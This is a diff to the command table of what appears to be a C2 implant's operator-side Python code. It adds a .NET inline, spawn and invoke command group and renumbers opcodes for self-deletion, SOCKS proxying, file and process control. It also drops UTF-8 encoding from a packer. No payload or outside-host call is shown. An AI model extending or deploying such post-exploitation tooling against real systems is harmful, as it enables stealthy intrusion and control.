@@ -23,7 +23,14 @@ T_DOWNLOAD  = 15;
 T_INFO      = 16;
 T_SELFDEL   = 17;
 T_EXIT      = 18;
-T_SOCKS     = 44;
+T_DOTNET    = 19;
+T_SOCKS     = 20;
+
+SB_DT_INLINE = 5;
+SB_DT_UNLOAD = 6;
+SB_DT_LIST   = 7;
+SB_DT_INVOKE = 8;
+SB_DT_SPAWN  = 9;
 
 SB_CFG_SLEEP  = 15;
 SB_CFG_MASK   = 16;
@@ -43,11 +50,12 @@ SB_PS_KILL   = 22;
 SB_FS_LS    = 30;
 SB_FS_CAT   = 31;
 SB_FS_PWD   = 32;
-SB_FS_CD    = 33;
-SB_FS_MV    = 34;
-SB_FS_CP    = 35;
+SB_FS_MV    = 33;
+SB_FS_CP    = 34;
+SB_FS_MKDIR = 35;
 SB_FS_DEL   = 36;
-SB_FS_MKDIR = 37;
+SB_FS_CD    = 37;
+
 
 Jobs = {
     "checkin":       {"hex_code": JOB_CHECKIN },
@@ -58,11 +66,22 @@ Jobs = {
 
 Commands = {
     # Task commands
-    "info":      {"hex_code": T_INFO},
+    "getinfo":   {"hex_code": T_INFO},
     "socks":     {"hex_code": T_SOCKS},
     "self-del":  {"hex_code": T_SELFDEL},
     "upload":    {"hex_code": T_UPLOAD},
     "download":  {"hex_code": T_DOWNLOAD},
+
+    "dotnet": {
+        "hex_code": T_DOTNET,
+        "subcommands": {
+            "inline": { "sub": SB_DT_INLINE },
+            "spawn" : { "sub": SB_DT_SPAWN },
+            "list-version": { "sub": SB_DT_LIST },
+            "unload": { "sub": SB_DT_UNLOAD },
+            "invoke": { "sub": SB_DT_INVOKE }
+        }
+    },
 
     # Exit method
     "exit": {
@@ -106,9 +125,9 @@ Commands = {
     "proc": {
         "hex_code": T_PROCESS,
         "subcommands": {
-            "run":  {"sub": SB_PS_CREATE},
-            "ps":   {"sub": SB_PS_LIST},
-            "cmd":  {"sub": SB_PS_CREATE},
+            "run" : {"sub": SB_PS_CREATE},
+            "list": {"sub": SB_PS_LIST},
+            "cmd" : {"sub": SB_PS_CREATE},
             "pwsh": {"sub": SB_PS_CREATE},
             "kill": {"sub": SB_PS_KILL}
         }
@@ -149,9 +168,6 @@ class Packer:
         return;
     
     def Bytes( self, data: str ) -> None:
-
-        if isinstance( data, str ):
-            data = data.encode( "utf-8" );
 
         fmt = "<L{}s".format( len( data ) + 1 );
 
